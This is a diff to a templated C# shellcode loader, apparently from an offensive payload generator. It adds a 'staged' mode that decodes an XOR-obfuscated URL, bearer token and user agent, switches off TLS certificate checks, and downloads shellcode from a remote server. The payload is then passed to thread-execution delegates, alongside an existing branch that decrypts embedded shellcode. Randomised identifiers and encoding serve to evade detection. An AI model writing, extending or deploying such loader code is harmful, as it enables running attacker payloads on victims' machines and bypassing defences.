@@ -83,12 +83,39 @@ namespace {{ appdomain_namespace }} {
             var {{ v.fn_nt_thread }} = ({{ v.del_nt_thread }})Marshal.GetDelegateForFunctionPointer(
                 {{ v.fn_exec }}_thrd,  typeof({{ v.del_nt_thread }}));
 
+            {%- if is_staged %}
+            byte[] {{ sg.sg_lv_url }} = new byte[]{ {% for b in staged_url_enc %}{{ b }},{% endfor %} };
+            for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_url }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_url }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_url_xk }};
+            byte[] {{ sg.sg_lv_jwt }} = new byte[]{ {% for b in staged_jwt_enc %}{{ b }},{% endfor %} };
+            for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_jwt }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_jwt_xk }};
+            byte[] {{ sg.sg_lv_ua }} = new byte[]{ {% for b in staged_ua_enc %}{{ b }},{% endfor %} };
+            for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_ua }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_ua }}[{{ sg.sg_lv_i }}] ^= (byte){{ staged_ua_xk }};
+            byte[] {{ v.var_shellcode }};
+            try {
+                System.Net.ServicePointManager.ServerCertificateValidationCallback = (a,b,c,d) => true;
+                System.Net.ServicePointManager.SecurityProtocol =
+                    (System.Net.SecurityProtocolType)3072 | (System.Net.SecurityProtocolType)768;
+                var {{ sg.sg_lv_req }} = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(
+                    System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_url }}));
+                {{ sg.sg_lv_req }}.Method = "GET";
+                {{ sg.sg_lv_req }}.UserAgent = System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_ua }});
+                {{ sg.sg_lv_req }}.Headers["Authorization"] = "Bearer " + System.Text.Encoding.ASCII.GetString({{ sg.sg_lv_jwt }});
+                using (var {{ sg.sg_lv_resp }} = ({{ sg.sg_lv_req }}.GetResponse() as System.Net.HttpWebResponse))
+                using (var {{ sg.sg_lv_buf }} = new System.IO.MemoryStream()) {
+                    if ((int){{ sg.sg_lv_resp }}.StatusCode != 200) return;
+                    {{ sg.sg_lv_resp }}.GetResponseStream().CopyTo({{ sg.sg_lv_buf }});
+                    {{ v.var_shellcode }} = {{ sg.sg_lv_buf }}.ToArray();
+                }
+            } catch { return; }
+            for (int {{ sg.sg_lv_i }} = 0; {{ sg.sg_lv_i }} < {{ sg.sg_lv_jwt }}.Length; {{ sg.sg_lv_i }}++) {{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}] = 0;
+            {%- else %}
             byte[] {{ v.var_key }} = {{ v.fn_hex }}({% for c in key_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %});
             for (int {{ v.var_iv }}_i = 0; {{ v.var_iv }}_i < {{ v.var_key }}.Length; {{ v.var_iv }}_i++)
                 {{ v.var_key }}[{{ v.var_iv }}_i] ^= (byte){{ key_tweak }};
             byte[] {{ v.var_shellcode }} = {{ v.fn_xor }}(
                 {{ v.fn_hex }}({% for c in shellcode_chunks %}"{{ c }}"{% if not loop.last %}+{% endif %}{% endfor %}),
                 {{ v.var_key }});
+            {%- endif %}
 
             IntPtr {{ v.var_region }} = IntPtr.Zero;
             UIntPtr {{ v.var_fiber }} = (UIntPtr){{ v.var_shellcode }}.Length;
